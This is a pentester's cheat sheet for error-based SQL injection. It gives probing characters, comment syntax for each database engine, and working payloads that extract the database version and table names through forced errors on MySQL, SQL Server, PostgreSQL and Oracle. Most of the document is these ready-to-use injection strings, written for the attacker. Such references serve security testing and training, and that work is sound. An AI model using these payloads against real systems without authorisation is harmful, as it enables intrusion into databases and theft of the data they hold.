# 1 - Error-Based SQLi Cheat Sheet

**Overview:** Error-based SQL Injection occurs when an attacker intentionally injects malformed syntax to force the database engine to return a verbose error message. These errors leak critical information about the database type, structure, and sometimes the actual data itself.

``---

##  1. Initial Discovery (The "Pokes")
Use these characters to intentionally break the backend SQL query. If the application is vulnerable and not catching errors, it will spit out a raw database error (e.g., `Syntax error near...`, `Unclosed quotation mark...`).

| Payload | Purpose |
| :--- | :--- |
| `'` | The classic single quote. Breaks string encapsulation. |
| `"` | The double quote. Breaks alternative string encapsulation. |
| `\` | The backslash. Often breaks escape sequences and causes syntax errors. |
| `')` or `")` | Breaks out of queries wrapped in parentheses. |
| `ORDER BY 1` | Injects valid syntax to see if the DB processes it (changes page behavior). |

---

##  2. Query Termination (The Comment Rules)
Once you break a query, you usually need to comment out the rest of the developer's original code so your payload executes cleanly without trailing syntax errors. 

** CRITICAL DIFFERENCE:** Databases handle comments differently. Knowing which one works is your first step in fingerprinting the backend!

| Database Engine | Comment Syntax | The Technical "Quirk" |
| :--- | :--- | :--- |
| **MySQL / MariaDB** | `--+` or `%23` | **Requires a space after the dashes.** Because browsers strip trailing spaces, pentesters use `--+` (the `+` URL-encodes to a space) or `%23` (the URL-encoded `#` symbol, which doesn't need a space). |
| **Microsoft SQL Server** | `--` | Does **not** require a space. `--` works immediately. |
| **PostgreSQL** | `--` | Does **not** require a space. |
| **Oracle** | `--` | Does **not** require a space. |
| **SQLite** | `--` | Does **not** require a space. |

---

##  3. Data Extraction via Errors
If a database shows verbose errors on the screen, you don't even need a `UNION` attack. You can force the database to evaluate a query, crash, and print the result *inside* the error message itself.

###  MySQL (Using XML Parsers)
MySQL will throw an error if you pass invalid XML to its parsing functions. We can append our query to this invalid data.

**Extract Database Version:**
sql
`' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))--+`

**Extract Table Names:**

SQL

`' AND UPDATEXML(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)), 1)--+`

*(Note: 0x5c is the hex value for a backslash \, which guarantees the XML parser fails and throws the error containing your data).*

### Microsoft SQL Server (MSSQL) (Using Type Conversion)

MSSQL will throw an error if you try to convert a string (like a username) into an integer.

**Extract Database Version:**

SQL

`' AND 1=CONVERT(INT, (SELECT @@version))--`

*Expected Error: Conversion failed when converting the nvarchar value 'Microsoft SQL Server...' to data type int.*

**Extract Table Names:**

SQL

`' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--`

### PostgreSQL (Using Type Conversion)

Similar to MSSQL, we force a type conversion error.

**Extract Database Version:**

SQL

`' AND 1=CAST((SELECT version()) AS INT)--`

*Expected Error: invalid input syntax for integer: "PostgreSQL 14.2..."*

### Oracle (Using Context Errors)

Oracle requires leveraging specific built-in packages that throw errors when fed bad data.

**Extract Database Version:**

SQL

`' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE ROWNUM=1))--`

